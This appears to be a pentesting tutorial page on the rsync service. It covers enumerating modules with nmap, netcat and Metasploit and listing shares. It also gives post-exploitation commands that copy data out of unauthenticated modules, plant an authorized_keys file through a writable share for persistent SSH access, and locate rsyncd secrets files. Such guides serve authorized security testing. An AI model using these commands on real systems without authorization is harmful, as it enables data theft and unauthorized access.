# 873 - Pentesting Rsync

## **Basic Information**

> **rsync** is a utility for efficiently [transferring](https://en.wikipedia.org/wiki/File_transfer) and [synchronizing](https://en.wikipedia.org/wiki/File_synchronization) [files](https://en.wikipedia.org/wiki/Computer_file) between a computer and an external hard drive and across [networked](https://en.wikipedia.org/wiki/Computer_network) [computers](https://en.wikipedia.org/wiki/Computer) by comparing the [modification times](https://en.wikipedia.org/wiki/Timestamping_\(computing\))and sizes of files.[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite_note-man_page-3) It is commonly found on [Unix-like](https://en.wikipedia.org/wiki/Unix-like) [operating systems](https://en.wikipedia.org/wiki/Operating_system). The rsync algorithm is a type of [delta encoding](https://en.wikipedia.org/wiki/Delta_encoding), and is used for minimizing network usage. [Zlib](https://en.wikipedia.org/wiki/Zlib) may be used for additional [data compression](https://en.wikipedia.org/wiki/Data_compression),[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite_note-man_page-3) and [SSH](https://en.wikipedia.org/wiki/Secure_Shell) or [stunnel](https://en.wikipedia.org/wiki/Stunnel) can be used for security.

**Default port:** 873

```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## Connect
To initiate a connection with an rsync server, use the rsync command followed by the rsync URL.
The URL format is `[rsync://][user@]host[:port]/module.``
```
rsync rsync://user@target_host/
```
## Enumeration
### Identifying an Rsync Server
You can use Nmap to check if there's an Rsync server on a target host like this:
```
nmap -p 873 X.X.X.X
```
### Banner & Manual communication
You can use Netcat to find out what service is running and its version by looking at the welcome message it shows when you connect. This method is called Banner Grabbing.
```
nc -nv X.X.X.X 873

# Expected output format
@RSYNCD: version
```
## Enumerate Modules
Enumeration is crucial in understanding the structure of the target rsync module and finding misconfigurations or sensitive information.

###  Using nmap
```
nmap -sV --script "rsync-list-modules" -p 873 target_host
```
### Using Metasploit
```
msf> use auxiliary/scanner/rsync/modules_list
```
### Enumerate Shared Folders
Rsync modules represent directory shares and may be protected with a password. To list these modules:
```
rsync target_host::
```
For detailed enumeration of a specific module to see files and permissions:
```
rsync -av --list-only rsync://target_host/module_name
```
# Attack Vectors
## Misconfigured Modules
Modules without proper authentication can be accessed by unauthorized users. This vulnerability allows attackers to read, modify, or delete sensitive data.

If a module is writable, and you have determined its path through enumeration, you can upload malicious files, potentially leading to remote command execution or pivoting into the network.

## Outdated Rsync Version
Old versions of rsync may contain vulnerabilities that can be exploited. Use tools like nmap with version detection to identify if the target is running an outdated rsync version.
```
nmap -sV --script=rsync-list-modules target_host
```
# Post-Exploitation
### Data Exfiltration
Sensitive data identified during enumeration can be exfiltrated using rsync:
```
rsync -avz target_host::module_name /local/directory/
```
## Gain Persistent Access
Upload artifacts like modified scripts or binaries to maintain access:
```
rsync -av home_user/.ssh/ rsync://user@target_host/home_user/.ssh
```

```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy        	
NAS_Public     	
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```

### **Enumerating Shared Folders**

**Rsync modules** are recognized as **directory shares** that might be **protected with passwords**. To identify available modules and check if they require passwords, the following commands are used:

```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

# Example with IPv6 and alternate port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```

Be aware that some shares might not appear in the list, possibly hiding them. Additionally, accessing some shares might be restricted to specific **credentials**, indicated by an **"Access Denied"** message.

### [**Brute Force**](../generic-hacking/brute-force.md#rsync)

### Manual Rsync Usage

Upon obtaining a **module list**, actions depend on whether authentication is needed. Without authentication, **listing** and **copying** files from a shared folder to a local directory is achieved through:

```bash
# Listing a shared folder
rsync -av --list-only rsync://192.168.0.123/shared_name

# Copying files from a shared folder
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```

This process **recursively transfers files**, preserving their attributes and permissions.

With **credentials**, listing and downloading from a shared folder can be done as follows, where a password prompt will appear:

```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```

To **upload content**, such as an _**authorized\_keys**_ file for access, use:

```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```

## POST

To locate the rsyncd configuration file, execute:

```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```

Within this file, a _secrets file_ parameter might point to a file containing **usernames and passwords** for rsyncd authentication.

## References

* [https://www.smeegesec.com/2016/12/pentesting-rsync.html](https://www.smeegesec.com/2016/12/pentesting-rsync.html)
